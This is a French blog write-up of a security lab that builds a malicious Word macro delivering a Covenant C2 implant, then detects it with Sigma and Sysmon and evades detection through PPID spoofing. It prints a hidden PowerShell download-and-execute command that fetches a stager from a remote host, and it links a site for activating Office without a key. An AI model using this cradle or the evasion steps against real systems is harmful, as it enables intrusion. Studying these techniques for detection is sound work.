---
layout: post
title: Attack Detection Fundamentals - Initial Access Lab 1
subtitle: Workshop de F-Secure - Utilisation de Covenant C2
gh-repo: 0xSs0rZ/0xSs0rZ.github.io
gh-badge: [star]
tags: [C2, Covenant, Word, Macro, VBA, Office 2016, Windows, PowerShell, Red Team, Blue Team, Sigma, Sysmon, MITRE ATT&CK, PPID Spoofing, Defense Evasion]
---

![Logo](/img/Covenant.png){: .center-block :}

F-Secure a récemment publié un série de labs sur la détection d'attaque dans les environnements Windows [1]. Nous commencerons ici avec le premier lab qui concerne l'étape d'accès initial et l'utilisation d'un serveur C2 [2].

**Définition:** *Initial access is the set of tactics, techniques and procedures used by malicious actors to obtain a foothold in the target environment*

**Descriptif du lab:** Création d'un payload en VBA qui utilise Powershell pour récupérer un stager sur un serveur distant. Cette technique est entre autre utilisée pour délivrer Emotet.

![3ea880e49c70c7ba921bb8de3d3d199a.png](/img/a1de2198688d46fd9df6fc26a0d77252.png){: .center-block :}
*Source: [3]*

PowerShell Empire utilise une méthode similiare.

**Objectif:**  Construire et analyser une macro Excel/Word malveillante qui utilise PowerShell pour établir une communication avec un serveur C2. 

Permettra de démontrer l'importance de l'analyse de process parent-enfant

**Lab Config:** VM Win 7 Entreprise avec Office 2016, git, Sigma et Sysmon + VM Ubuntu avec Covenant

**Covenant:** *Covenant is a collaborative .NET C2 framework for red teamers.* 

**Set-Up:**

1. Victime: Windows 7

Installation de Office 2016 dans Windows 7

- [Download Office 2016](https://www.clubic.com/telecharger-fiche431791-office-2016.html)

- [Activer Office 2016 sans clé](https://downloadappsforfree.com/activate-microsoft-office-2016-without-product-key-free-2019/)

Installer git pour windows

Installer Sysmon: `sysmon -i -l -n -h md5,sha256`

![f6f17a01f1aa82cd4417161020370db3.png](/img/b34c7c0a3756404b9f113f81b8babb8c.png)

Désactiver l'AV et le firewall

2. Installation de Covenant sur Ubuntu

2.1. Installation de .NET Core SDK 3.1

```
sudo wget https://packages.microsoft.com/config/ubuntu/20.04/packages-microsoft-prod.deb -O packages-microsoft-prod.deb
sudo dpkg -i packages-microsoft-prod.deb
sudo add-apt-repository universe
sudo apt-get update
sudo apt-get install apt-transport-https
sudo apt-get update
sudo apt-get install dotnet-sdk-3.1
```

2.2. Installation de Covenant

```
git clone --recurse-submodules https://github.com/cobbr/Covenant
cd Covenant/Covenant
sudo dotnet build
sudo dotnet run
```
![9e5cf541dfe4b92bd867dabab5ae1cae.png](/img/0a7591fb29734b70a0b216399067e535.png)

3. Création de l'admin

![11b456cfe6580929743ff0625f82ef34.png](/img/9b543feba7f54af0927d304591d9d1ff.png)


![78716384a979d9c66a8220307e9bea16.png](/img/fd458101194a4743afd34029e339ed91.png)

4. Création d'un listener

![70b48204144824df89c0acc40a0286e5.png](/img/935015148e3a471eb2cf735e877e0bac.png)

listener http sur le port 80. Utilisation de l'IP de la VM Ubuntu

![660b3484fbf8f60bdd4d899ee33ba080.png](/img/cc32d42cf0aa4490b97313c9b1ac7ea5.png)

![53f723aa1b77732aeb17d537b86b0db5.png](/img/260801141006493ca103a5a8c0803fb9.png)

![c6f0c12fbe1df59251da22970991986d.png](/img/bfa3e9d1b33345c388762f3898601b36.png)

5. Génération du payload

Utilisation de l'implant PowerShell par défaut de Covenant = signature connue -> AV doit être désactivé

Launchers > PowerShell

![dfbe97ba4a5666dce81809bd5d796031.png](/img/32d60b09ea3448e587d298997e95e84f.png)

Laisser les paramètres par défaut et générer

![085ddcd14395108ec60a67fbec5a566f.png](/img/5cbd8e58770b4cb892a0fb65982feeb6.png)

![fb4d263c382e93a8bbbfa8d69a976033.png](/img/632c1b4d259a4c808f621c687eb3bfc6.png)

Ce payload est stageless. Nous on veut un payload avec des stages. Pour cela Host

![1fb7f71cf2a87b56a1e4933f9d3eaf79.png](/img/0fafd9ecd0a84a7889e260aaa388ccb2.png)

Saisir le nom de l'emplacement ici test.ps1 et cliquer sur 'Host'

ça crée un fichier qu'on peut retrouver en passant dans Listeners

![5450d5a86515b28e020c3524be796584.png](/img/982c2b01debc4c899dcb7c8ace4129c8.png)

![f1b0f0694a610989cb2c94d0d796cd9d.png](/img/1a992c4a7d7b42f0916c7943cc49eeda.png)

Dans launcher on a désormais du code avec 'iex' pour download le payload

![72c27eb6c56cf030eb5f08fdebf54ece.png](/img/c74da7d0b8554547a536609952ead771.png)

`powershell -Sta -Nop -Window Hidden -Command "iex (New-Object Net.WebClient).DownloadString('http://192.168.1.94/test.ps1')"`

6. Création d'un maldoc Word

Ouvrir Word, clic droit sur le ruban et 'Personaliser le ruban'

![e747eab001e295e23b54ca796dc4705f.png](/img/edced98199114932a883419ef076194d.png)

Cocher 'développeur'

![0cd1193498a933a1ba28966185fe9fe1.png](/img/bf8ee35bc2ef4b2faa67604c19db2ff2.png)

Aller dans l'ongler développeur puis Visual Basic

![87458c299129a4fc1e11bcc650e9ba95.png](/img/2359aef8466b42daacbb07d97bb49e49.png)

Dans l'éditeur, mettre le code du payload

```
Sub AutoOpen()
	Call Shell("powershell blabliblablabla")
End Sub
```

![526529edce21a21cad7df6241bfa4265.png](/img/d2c8d9a7d0be4c5c972089b30cf2854d.png)

Lancer le code et on a un grunt

![5c3d970e97c25b6386ada7d1fc648386.png](/img/bb4c1728ac734bcb885a2a4a347fb35d.png)

On peut interagir avec: `interact`

![5465ab9824de46d775f6071a164835aa.png](/img/ad7de87387294b518402e3dcacab0212.png)

# Analyse

**Objectif:** Utilisation d'une règle Sigma pour chercher des processus anormaux engendrés par Office dans le journal d'évenement Sysmon

**Sigma:** Sigma is for log files what Snort is for network traffic and YARA is for files. [10]

**Sysmon:** System Monitor (Sysmon) (...) provides detailed information about process creations, network connections, and changes to file creation time. By collecting the events it generates using Windows Event Collection or SIEM agents and subsequently analyzing them, you can identify malicious or anomalous activity and understand how intruders and malware operate on your network. [11]

**Installation de sigma**

![6193d7cf4ea6a4a6e1e35dffa452fbc9.png](/img/8b1546fb39584fe4b4d293767fe2be94.png)

installation des dépendances: `pip3 install sigmatools`

Étant donné qu'on a pas de SIEM déployé pour tester la règle sigma, on va utiliser PowerShell à la place

`python sigmac -t powershell ../rules/windows/process_creation/win_office_shell.yml`

![b61df295987595ee901f49dfe592384a.png](/img/868435c344b0436e93263091973bdc5c.png)

On teste la commande qu'on vient de générer

![6f37c8ae563069f8d4a970a96f1074e1.png](/img/1d50dc80fd804b99a15a26fca7546567.png)

On voit très bien le payload de Covenant et la relation parent-enfant

**PPID-Spoofing**

Il est possible d'usurper le PPID et la ligne de commande pour éviter la détection [12]

![f2950d1aaf9abd5492b5a75b4b5e9f16.png](/img/42439c12c48347218548cdaa2268cf8b.png)

Ici nous utiliserons macro.vba disponible ici: https://github.com/christophetd/spoofing-office-macro

*PoC of a VBA macro spawning a process with a spoofed parent and command line*

![336a73d57f4f0f35c7fca7ef062fab81.png](/img/3e13acb363f147a2887cd380dc898d72.png)

On modifie le ligne de commande cmdStr avec notre payload Covenant

![b158eaa20dcf6342bbd9dc0b5fa9749a.png](/img/7caf9c0deb964330b87405cf1137f442.png)

On lance le code et on a bien une nouvelle session dans Covenant

![79e896d6fc3daa1bc95a48ea454cd672.png](/img/d9978b45a10249298797bd8604e1dca3.png)

On relance la commande PowerShell pour la règle Sigma et on observe rien de nouveau...

Ouvrir Event Viewer et se rendre à Applications and Services Logs/Microsoft/Windows/Sysmon/Operational

On regarde les logs et on trouve:

![6df2970577accad8494985073ec113c1.png](/img/296fea153b094d64843bafbdf1f4b9f1.png)

On voit dans CommandLine: `powershell.exe -NoExit -c Get-Service -DisplayName '*network*' | Where-Object { $_.Status -eq 'Running' } | Sort-Object DisplayName`

Cette commande semble bénine mais en réalité il s'agit de l'installation de notre implant Covenant...

# Conclusion

Dans ce lab, nous avons vu:

- comment créer un document Word malveillant qui utilise Covenant comme infra C2
- comment utiliser une règle Sigma pour analyser les logs Sysmon
- comment spoofer le PPID afin de bypass les systèmes de détection


# Références

[1] F-Secure, *Attack Fundamentals Workshops*, https://www.f-secure.com/en/consulting/events/attack-detection-fundamentals-workshops 

[2] F-Secure, *Attack Detection Fundamentals - Initial Access Lab1*, https://labs.f-secure.com/blog/attack-detection-fundamentals-initial-access-lab-1/

[3] TechTarget, *Command-and-control servers: The puppet masters that govern malware*, https://searchsecurity.techtarget.com/feature/Command-and-control-servers-The-puppet-masters-that-govern-malware

[4] Cobbr, *Covenant - Installation and Startup*, https://github.com/cobbr/Covenant/wiki/Installation-And-Startup

[4] *Install .NET Core SDK 3.1 in Ubuntu 20.04LTS*, https://abhisheksubbu.github.io/dotnet-core-install-ubuntu-20-04-lts/

[5] Hakin9, *Covenant the .NET based C2 on Kali Linux*, https://hakin9.org/covenant-the-net-based-c2-on-kali-linux/

[6] Cobbr, *Covenant: The Usability Update*, https://cobbr.io/Covenant-The-Usability-Update.html

[7] *Getting Started with Covenant*, https://fatrodzianko.com/2019/08/14/getting-started-with-covenant-c2/

[8] *Setup Configuration and Task Execution with Covenant: The Complete Guide*, https://stealthbits.com/blog/setup-configuration-and-task-execution-with-covenant-the-complete-guide/

[9] *Interacting with Covenant C2*, https://bestestredteam.com/2020/02/19/interacting-with-covenant-c2/

[10] Neo23x0, *Sigma*, https://github.com/Neo23x0/sigma/

[11] Windows, *Sysmon*, https://docs.microsoft.com/en-us/sysinternals/downloads/sysmon

[12] MITRE ATT&CK, *Defense Evasion*, https://attack.mitre.org/tactics/TA0005/

**Poursuivez avec :** 

- [SSH Port Forwarding - Cheat Sheet](https://0xss0rz.github.io/2020-11-21-SSH-Tunneling/)

- [Hack The Box - Cache](https://0xss0rz.github.io/2020-11-18-HTB-Cache/)

- [Hack The Box - Remote](https://0xss0rz.github.io/2020-08-23-HTB-Remote/)

[![CC-BY](https://mirrors.creativecommons.org/presskit/buttons/88x31/svg/by.svg)](https://creativecommons.org/licenses/by/4.0/)

This work is licensed under a [Creative Commons Attribution 4.0 International License](https://creativecommons.org/licenses/by/4.0/).
